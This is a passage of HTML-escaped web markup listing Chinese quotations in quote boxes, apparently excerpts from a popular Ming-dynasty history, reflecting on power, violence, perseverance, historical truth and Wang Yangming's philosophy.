class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人要显示自己的力量，从来不是靠暴力，挑战这一准则的人必然会被历史从强者的行列中淘汰，历来如此。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;最强大的武器，不是军队的人数，不是强大的舰队，而是人心。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;诸位可以借鉴，遇到恨透一个人、想要拿刀去砍人的时候，用张定边的事迹勉励一下自己，不要生气，修身养性，活得比他长就是了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;每一种主张的背后，都隐藏着某种势力或者利益的群体。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的书籍都有立场，所有的立场都有倾向。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;这个世界上，最让人畏惧的就是未知，如果人人都知道自己的未来，他们就不会再害怕。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;真正支配历史的人，不是朱元璋，而是稻田里辛勤劳作的老农，是官道上来往的商贾，是朝堂上进言的官员，是孤灯下苦读的学子。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;简单的占有是小聪明，暂时的放弃才是大智慧。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;他告诉我们，坚强的意志和决心可以战胜一切困难。他告诉我们，执着的信念和无畏的心灵才是最强大的武器。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;读书的能力和处理问题的能力是不一样的。书读得好，不代表事情能处理得好；能列出计划，不代表能够执行计划。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;榜样的力量是无穷的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;即使你的敌人无比强大，即使你没有好的应对方法，但只要你有敢于面对强敌的决心和勇气，你就会发现，奇迹是可以创造的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;失败算不了什么，希望的丧失才是最大的痛苦。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;是的，从历史中我们可以知道，宽容从来都不是软弱。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了名利去做一件事情也许可以获得动力和成功，但要成就大的事业，需要的是另一种决心和回答——为了读书而读书。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历史的真相始终是被笼罩在迷雾中的，无数人为了各种目的去修饰和歪曲它，以适应自己的需要。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;强而不欺，威而不霸，是一个伟大国家和民族的气度与底蕴。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;暴力可以成为解决问题的后盾，但绝对不能解决问题。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;朝廷就是一个小社会，皇帝大臣们和地痞混混也没有什么区别，不过是吃得好点，穿得好点，人品更卑劣，斗争更加激烈点而已。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;无论在多么绝望的情况下，也不要放弃希望，坚持下去，就一定能够创造奇迹。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个污浊的世界上，能够干干净净度过自己一生的人，是值得钦佩的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这世上，爱一个人不需要理由，从来都不需要。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当一个人不得不走向死亡时，自杀代表着尊严和抗争。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;山近月远觉月小，便道此山大于月。&#xA;若人有眼大如天，当见山高月更阔。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“天下之大，虽离家万里，何处不可往！何事不可为！”王守仁大笑着。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有夺走你所拥有的一切，你才能摆脱人世间之一切浮躁与诱惑，经受千锤百炼，心如止水，透悟天地。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要想实现崇高伟大的志向，必须有符合实际、脚踏实地的方法。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;无善无恶心之体，有善有恶意之动。&#xA;知善知恶是良知，为善去恶是格物。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;观点斗争是假的，方向斗争也是假的，只有权力斗争才是真的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;纵使憨直，诚然不屈，这就是明代官员的气节。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;那些二十岁的青年人是不会懂得这些的，他们太天真、太幼稚，他们或许能够在考试中得到一百分，却不可能真正了解其中的含义。所以，他们虽然手握真理，却无法使用，满怀热情地踏入社会，却被撞得头破血流。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个残酷的现实面前，徐阶终于明白了知行合一的真意，无论有多么伟大正直的理想，要实现它，还必须懂得两个字——“变通”。只有变通，只有切合实际的行动，才能适应这个变化万千的世界。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有真正了解这个世界的丑陋与污浊，被现实打击，被痛苦折磨，遍体鳞伤、无所遁形，却从未放弃对光明的追寻，依然微笑着坚定前行的人，才是真正的勇者。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所谓事可以做绝，话不能说绝，是也。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历经磨难，矢志不移，叫作信念。&#xA;不畏强权，虽死无惧，叫作勇气。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;历史告诉我们，所谓道德与公理，只有在实力相等的情况下才能拿出来讨论。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以他终于意识到，把自己的命运和信念寄托在一个人身上，是极其不靠谱的，亲密战友胡宗宪也不例外。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“鞠躬尽瘁，夕死无憾，此即长生之术！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;等待只因值得，隐忍只为爆发，要坚信，属于我们的机会终会到来。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary 